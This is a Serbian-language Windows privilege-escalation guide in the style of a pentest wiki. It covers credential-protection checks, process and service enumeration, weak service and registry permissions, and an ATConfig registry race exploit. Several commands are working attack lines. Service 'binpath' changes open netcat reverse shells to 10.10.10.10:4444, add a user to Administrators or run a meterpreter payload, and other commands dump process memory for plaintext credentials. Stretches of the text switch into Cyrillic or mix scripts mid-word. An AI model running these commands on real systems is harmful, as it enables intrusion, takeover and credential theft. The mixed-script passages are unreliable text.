### Postavke revizije

Ove postavke određuju šta se **beleži**, zato obratite pažnju

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding: korisno je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je namenjen **upravljanju lozinkama lokalnog Administratora**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u okviru Active Directory-ja i mogu im pristupiti samo korisnici kojima su preko ACL-ova dodeljene dovoljne dozvole, što im omogućava da vide lozinke lokalnog administratora ako su ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njenu memoriju** ili ubacuju kôd, dodatno štiteći sistem.\
[**Više informacija o LSA Protection ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti pristupne podatke sačuvane na uređaju od pretnji kao što su pass-the-hash napadi. [**Više informacija o funkciji Credential Guard dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Domenske akreditive** autentifikuje **Local Security Authority** (LSA), a koriste ih komponente operativnog sistema. Kada registrovani bezbednosni paket autentifikuje podatke za prijavu korisnika, obično se uspostavljaju domenski akreditivi za tog korisnika.\
[**Više informacija o keširanim akreditivima ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Popis korisnika i grupa

Trebalo bi da proverite da li neka grupa kojoj pripadate ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Ovde saznajte više o privilegovanim grupama i o tome kako da ih zloupotrebite za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows tokeni**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i o tome kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / sesije

```bash
qwinsta
klist sessions
```

### Korisničke fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Dohvatanje sadržaja međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za datoteke i fascikle

Pre svega, pri izlistavanju procesa **proverite da li se lozinke nalaze u komandnoj liniji procesa**.\
Proverite da li možete **da zamenite neku pokrenutu binarnu datoteku** ili imate dozvole za pisanje u fasciklu binarne datoteke, kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**; možete ih zloupotrebiti za eskalaciju privilegija](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener može kratko da traje, pa njegovo odsustvo iz jednog pasivnog snimka portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; samo ime aplikacije ili debug flag ne dokazuje mogućnost izvršavanja koda između korisnika. Rutinsko enumerisanje obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola nad binarnim datotekama procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola za fascikle u kojima se nalaze binarne datoteke procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort direktorijumi za dinamičke preprocesore

Snort 2 može da učitava deljene biblioteke iz `dynamicpreprocessor directory` deklarisanog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Za zakazani zadatak ili servis koji pokreće Snort pod drugim nalogom, pregledajte baš tu konfiguraciju i ACL deklarisanog direktorijuma modula. Ako vaš token može da kreira datoteke u tom direktorijumu, tu putanju treba proveriti kao moguću putanju za izvršavanje koda kada taj zadatak ili servis sledeći put učita module. Proverite efektivne privilegije naloga pod kojim se program pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja zabrane ili deljenja; sama mogućnost upisivanja u direktorijum ne dokazuje eskalaciju. [Snort's dynamic-preprocessor documentation](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani veb-servis sa direktorijumom dokumenata u koji se može pisati

Na Windows instalaciji Apache-a, uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa `DocumentRoot` vrednošću u aktivnoj datoteci `httpd.conf`. Kod uobičajenog XAMPP rasporeda, pregledajte `C:\xampp\apache\conf\httpd.conf` i ACL podešenog direktorijuma dokumenata, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom direktorijumu dok se Apache pokreće kao `LocalSystem`, izvršavanje serverskog koda može preći granicu privilegija hosta. Potvrdite da servis radi, da se koristi tačna putanja i da rukovalac na strani servera obrađuje tip datoteke; mogućnost upisivanja u direktorijum sama po sebi dokazuje samo kreiranje datoteka. Pregledajte ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za uobičajenu WAMP instalaciju, servis može da pokazuje na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), sa konfiguracijom u susednom direktorijumu `conf\httpd.conf` i podrazumevanim korenom `C:\wamp64\www` ili `C:\wamp\www`. Zajedno proverite tačnu putanju izvršne datoteke servisa, identitet pod kojim se izvršava, efektivni `DocumentRoot` (uključujući razrešavanje `${INSTALL_DIR}` i zamene u virtual hostovima) i ACL korena. To što je WAMP direktorijum upisiv ne dokazuje da se Apache izvršava kao `SYSTEM` niti da izvršava poslatu datoteku. [Apache dokumentuje kako Windows servis bira konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Upisiv IIS koren i mrežni identitet application pool-а

Kod IIS-a povežite upisiv fizički direktorijum sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite konfigurisani pool i server-side handler. Kôd smešten u direktorijum koji se servira izvršava se kao pool samo ako IIS obrađuje taj tip datoteke i ruta je dostupna. Pre nego što upisiv direktorijum smatrate putem do izvršavanja koda, proverite efektivna prava trenutnog korisnika za kreiranje datoteka, stanje sajta, handler i zamene za konkretnu putanju.

Dinamička kompilacija ASP.NET-a uvodi zasebnu putanju koju treba proveriti: generisane datoteke u direktorijumu za kompilaciju aplikacije. Podrazumevano se koristi direktorijum `Temporary ASP.NET Files` unutar odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` u aplikaciji može da ga promeni. [Microsoft dokumentuje lokaciju i poddirektorijume za pojedinačne aplikacije](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolovanje direktorijuma za kompilaciju kada application pool-ovi ne veruju jedni drugima](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni generisani izvorni kôd u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo kompajlira pod privilegovanijim [identitetom worker procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL datoteke ili direktorijuma ne dokazuje izvršavanje koda: uporedite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-ом, postavkama kompilacije, identitetom procesa i vremenom ponovne kompilacije. Koristite pregled metapodataka samo za čitanje; tokom enumeracije nemojte pokретати kompilaciju niti menjati датотеке keša.

IIS pool konfigurisan kao `ApplicationPoolIdentity` ili `NetworkService` obično se autentifikuje prema resursima domena koristeći **nalog računara domaćina**, iako njegov lokalni token može imati niske privilegije. `LocalSystem` već ima visoke lokalne privilegije i takođe koristi nalog računara na mreži; `LocalService` obično koristi anonimne mrežne akreditive. Pool `SpecificUser` koristi konfigurisani nalog. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet application pool-а](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ako postavka identiteta nije navedena, mogu da se naslede podrazumevane vrednosti pool-а, koje se razlikuju između generacija IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu imena pool-а. Ako izvršavanje koda dosegne pool sa mrežnim identitetom naloga računara, procenite prava u direktorijumu za **konkretan računar**. [DCSync](../active-directory-methodology/dcsync.md) zahteva prava za replikaciju na kontekstu imenovanja domena; tiket naloga računara ili uloga hosta sami po sebi ih ne dokazuju. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ове, bez otpremanja datoteke, uspostavljanja mrežne autentifikacije ili zahtevanja tiketa.

Kod čitljivog ASP.NET handler-а koji pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i formiranje komande. Handler koji spaja dekodirani token sa `ProcessStartInfo("cmd", "/c ...")` može da dozvoli metaznakovima shell-а da promene komandu; [Microsoft dokumentuje posebne znakove komande `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdani pozivalac zaista može da utiče na dekodiranu vrednost i pristupi handler-у, a zatim utvrdite efektivni identitet application pool-а ili impersonation-а i identitet podređenog procesa. Čitljiva izvorna linija, localhost listener ili slabost formata tokena sami po sebi ne dokazuju izvršavanje privilegovanih komandi. Pregledajte izvorni kôd i konfiguraciju pool-а bez slanja falsifikovanih zahteva ili pokretanja pomoćног procesa tokom pasivne enumeracije.

Kod PHP servisa na Windows-u, putanja kontrolisana zahtevom i prosleđena funkciji [`include` ili `require`](https://www.php.net/manual/en/function.include.php) može da izvrši PHP datoteku koju može da menja korisnik sa nižim privilegijama, pod identitetom worker-а. Potvrdite da zahtev može da dođe do te naredbe, da razrešena putanja upućuje na datoteku koju korisnik sa nižim privilegijama može da menja, a worker da čita, da važeća PHP ograničenja putanje dozvoljavaju uključivanje i da se worker zaista izvršava sa višim privilegijama. Loopback listener ili upisiva datoteka sami po sebi ne dokazuju ovaj lanac; pregledajte izvorni kôd, identitet servisa i ACL-ове datoteka bez pozivanja endpoint-а tokom pasivne enumeracije.

### Pronalaženje lozinki u memoriji

Možete napraviti dump memorije pokrenutog procesa pomoću **procdump** iz paketa sysinternals. Servisi poput FTP-a imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite dump memorije i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nezaštićene GUI aplikacije

**Aplikacije koje rade kao SYSTEM mogu korisniku omogućiti da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support” (Windows + F1), pretražite „command prompt” i kliknite na „Click to open Command Prompt”

### Uvoz projektnih datoteka sa privilegijama

Aplikacija koja automatski otvara projekte iz padajućeg direktorijuma u koji može da upisuje korisnik sa nižim privilegijama prelazi granicu poverenja u ulaznim podacima pod nalogom uvoznika. Proverite **tačnu putanju u koju može da se upisuje**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Istorijski problem u Ghidra-i pri otvaranju/obnavljanju projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je XML external entities u metapodacima projekta; mrežni entitet u Windows-u mogao je da izazove autentifikaciju naloga koji obavlja uvoz ako to dozvoljavaju [pravila za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To je trag o mogućem izlaganju kredencijala, a ne neposredan pristup administratora: odgovor mora moći da se iskoristi zasebnim ovlašćenim ili ranjivim putem, a aktuelne verzije treba proveriti u odnosu na njihovo stvarno stanje zakrpa. Tokom pasivne enumeracije nemojte otvarati namenski pripremljen projekat; pregledajte tok uvoza i ACL-ove.

## Usluge

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) na objektu Service Control Manager (SCM) odvojeno je od prava nad postojećom uslugom. Uspešan zahtev samo za čitanje [`OpenSCManager` za pristup](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) tom pravu predstavlja trag za proveru, a ne dokaz da nova usluga može da se pokrene. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pravima pristupa usluzi zatraženim prilikom njenog kreiranja; kasnije ponovno otvaranje usluge podrazumeva zasebnu proveru pristupa i može da ne uspe čak i kada je mogao da se iskoristi prvobitni handle. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, nalog usluge, pravilo pokretanja i putanju izvršne datoteke. Tokom pasivne enumeracije nemojte kreirati ni pokretati uslugu.

Kod udaljenog puta za instaliranje usluge, povežite ta SCM prava sa deljenim direktorijumom na ciljnom računaru u koji isti mrežni nalog može da upisuje, osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog usluge може да покрене. Налог који није администратор може да пређе ову границу ако постоје неуобичајено широка SCM права и могућност постављања датотеке; административни дељени директоријум није неопходан услов. Сам приступ за упис у дељени директоријум или само траг о праву за креирање услуге у SCM-у не доказују да нова услуга може да се покрене са вишим идентитетом.

Постојећа услуга може да позове помоћну извршну датотеку при покретању, гашењу или неком другом догађају животног циклуса, чак и ако та помоћна датотека није наведена у њеном `ImagePath`. Ако се име помоћне датотеке разрешава у директоријум у који може да уписује корисник са нижим привилегијама, а услуга ради са вишим идентитетом, недостајућа помоћна датотека може бити условни кандидат за замену. Потврдите **стварни код услуге или документовани позив помоћне датотеке**, разрешену путању извршне датотеке и редослед претраге, права за креирање директоријума, идентитет услуге и доступан окидач животног циклуса. Директоријум услуге у који може да се уписује или сама недостајућа датотека не доказују да услуга учитава датотеку; током пасивне провере немојте покретати ни заустављати услугу.

За постојећу услугу, [`SERVICE_START` омогућава прослеђивање аргумената функцији `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); то право је различито од [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Прегледајте код услуге или документовани интерфејс пре него што приступ за покретање сматрате нечим више од права за управљање. Ако услуга користи аргумент који је изабрао позивалац као путању за евиденцију или извоз, проверите идентитет услуге, тачан ток аргумента до операције уписа, ограничења путање и дозволе **креиране датотеке**. Упис у заштићени директоријум може довести до ескалације само ако постоји засебан привилеговани процес који користи или учитава ту датотеку; сама могућност уписа у евиденцију или право за покретање нису довољни. Током пасивног пописа немојте покретати услугу нити креирати пробну датотеку.

Код агента за надгледање NSClient++, читљиви `nsclient.ini` представља **траг за проверу конфигурације**: може да садржи веб креденцијале, док `boot.ini` може да преусмери конфигурацију на другу локацију. Проверите стварни налог услуге, WEB listener и правила приступа, као и да ли улога након аутентификације може да мења подешавања или скрипте. За привилеговано извршавање додатно су неопходни `CheckExternalScripts` (или други омогућени пут за извршавање), ефективно право за регистровање или измену команде и окидач који је покреће под идентитетом услуге. Listener ограничен само на loopback и даље може бити доступан локалном кориснику, али сама путања до датотеке, лозинка или listener не доказују постојање тих права. Током пасивне enumerације прегледајте метаподатке и дозволе без приказивања тајни или позивања веб API-ја. Погледајте [распоред датотека NSClient++](https://nsclient.org/docs/concepts/file-layout/), [безбедносне смернице за веб и скрипте](https://nsclient.org/docs/setup/securing/) и [конфигурацију external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

За услугу чији је `ImagePath` `nssm.exe`, проверите стварни налог под којим услуга ради и њену вредност `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM ту чува подређену апликацију](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), док је `AppDirectory` њен конфигурисани радни директоријум. Проверите ACL-ове подређене извршне датотеке и њеног надређеног директоријума пре него што права wrapper-а сматрате целом границом услуге. Локална WCF или SOAP крајња тачка коју открива подређена апликација представља засебан траг за проверу: потврдите да је доступна кориснику са нижим привилегијама, да тачна операција прихвата његов улаз и да подређена услуга извршава небезбедну операцију са вишим идентитетом. Сам налог услуге, URL крајње тачке или путања у коју може да се уписује не доказују ескалацију; током пасивне enumerације немојте позивати операције услуге.

За прилагођену WCF операцију, пратите стринг под контролом позиваоца до сваког PowerShell runspace-а. [`Pipeline.Commands.AddScript` додаје текст скрипте](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` покреће pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` са Windows транспортним креденцијалима](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) потврђује идентитет клијента, али овлашћење за позивање те **конкретне** операције и ефективни идентитет runspace-а морају се проверити засебно. Путања од улаза позиваоца са нижим привилегијама до `AddScript` под вишим идентитетом услуге представља границу за извршавање кода; порт који слуша, аутентификовани клијент или неискоришћена метода у неповезаном склопу сами по себи нису доказ. Статички прегледајте инсталирану услугу, уговор, овлашћења и подешавања impersonation-а без позивања крајње тачке током enumerације.

Service Triggers омогућавају Windows-у да покрене услугу када се испуне одређени услови (активност named pipe/RPC крајње тачке, ETW догађаји, доступност IP адресе, прикључивање уређаја, освежавање GPO-а итд.). Чак и без права SERVICE_START често можете покренути привилеговане услуге активирањем њихових окидача. Технике enumerације и активације погледајте овде:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Услуга Visual Studio diagnostic collector

Инсталације Visual Studio-а са C/C++ алатима могу да садрже `VSStandardCollectorService150`, дијагностичку услугу конфигурисану да ради као `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) користио је junction и object-manager-link race да преусмери ресетовање DACL-а услуге. Приказана ескалација такође је захтевала употребљив пут за поправку MSI-ја Visual Studio Setup WMI Provider-а и његову циљну датотеку `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонента је исправљена у јануару 2024.

За пасивну тријажу проверите налог те услуге и путању до бинарне датотеке, проверите да ли постоји путања до Setup WMI compiler-а и утврдите статус закрпа инсталиране компоненте. Унос услуге, верзија производа Visual Studio или сама датотека compiler-а не доказују да је хост рањив. Провера не захтева покретање услуге нити покретање поправке.

Преузмите листу услуга:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarnu datoteku **accesschk** iz _Sysinternals_ alata za proveru potrebnog nivoa privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li grupa "Authenticated Users" može da menja neku uslugu:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ovde možete preuzeti accesschk.exe za XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućite servis

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Greška sistema 1058._\
_Usluga ne može da se pokrene jer je onemogućena ili zato što sa njom nisu povezani omogućeni uređaji._

Možete je omogućiti pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Uzmite u obzir da servis upnphost zavisi od SSDPSRV-a da bi radio (za XP SP1)**

**Još jedno zaobilazno rešenje** ovog problema je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ ima **SERVICE_ALL_ACCESS** nad servisom, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati pomoću različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava ponovno konfigurisanje binarne datoteke servisa.
- **WRITE_DAC**: Omogućava ponovno konfigurisanje dozvola, čime se stiče mogućnost izmene konfiguracije servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i ponovno konfigurisanje dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost izmene konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost izmene konfiguracije servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za binarne datoteke servisa

Ako se servis izvršava kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može preoteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju servis izvršava** ili imate **dozvole za pisanje u fasciklu** u kojoj se nalazi binarna datoteka ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Pomoću **wmic** (ne u system32) možete da pronađete sve binarne datoteke koje izvršava servis, a zatim pomoću **icacls** proverite svoje dozvole:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL-ove dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito **`(F)`**, **`(M)`** ili **`(W)`** na izvršnoj datoteci servisa ili direktorijumu koji je sadrži. Praktičan tok zloupotrebe je:<sup>[[27]](#references)</sup>

1. Potvrdite nalog servisa i putanju do izvršne datoteke pomoću `sc qc <service_name>`.
2. Potvrdite da je binarna datoteka upisiva pomoću `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili validnom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako servis ne dozvoljava običnom korisniku da ga ponovo pokrene, proverite da li se automatski pokreće pri pokretanju sistema, da li ima akciju pri otkazu koja ga ponovo pokreće ili može indirektno da ga pokrene aplikacija koja ga koristi.

### Dozvole za izmenu registra servisa

Treba da proverite da li možete da izmenite neki registar servisa.\
Možete da **proverite** svoje **dozvole** nad **registrom** servisa pomoću:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za upis u ključ registratora određene usluge. Sam unos u ACL-u ne dokazuje efektivan pristup: važni su unosi za zabranu, trenutni token i nasleđene dozvole. Prava nad ključem registratora razlikuju se od prava `SERVICE_CHANGE_CONFIG` i `SERVICE_START` nad objektom usluge. Za eskalaciju su takođe potrebni upotrebljivo polje konfiguracije usluge, način da se usluga pokrene i identitet usluge sa višim privilegijama. Pogledajte Microsoftove reference za [prava nad ključem registratora](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [prava pristupa usluzi](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili putanju binarne datoteke koja se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka sa simboličkim linkom u registru za proizvoljan upis vrednosti u HKLM (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju ATConfig ključeve za svakog korisnika, koje kasnije **SYSTEM** proces kopira u ključ sesije u HKLM-u. **Trka sa simboličkim linkom** u registru može da preusmeri taj privilegovani upis na **bilo koju putanju HKLM-a**, čime se dobija mogućnost **proizvoljnog upisa vrednosti** u HKLM.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju kontroliše korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijavljivanja ili prelaska na bezbednu radnu površinu i korisnik može da upisuje u njega.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Postavite vrednost **HKCU ATConfig** koju želite da upiše SYSTEM.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće AT broker tok.
3. **Pobedite u trci** tako što ćete postaviti **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite ključ **HKLM Session ATConfig** vezom registra ka zaštićenoj ciljnoj putanji HKLM-a.
4. SYSTEM upisuje vrednost koju je izabrao napadač na preusmerenu putanju HKLM-a.

Kada dobijete mogućnost proizvoljnog upisa vrednosti u HKLM, pređite na LPE tako što ćete prepisati konfiguracione vrednosti servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** kao deo trke.

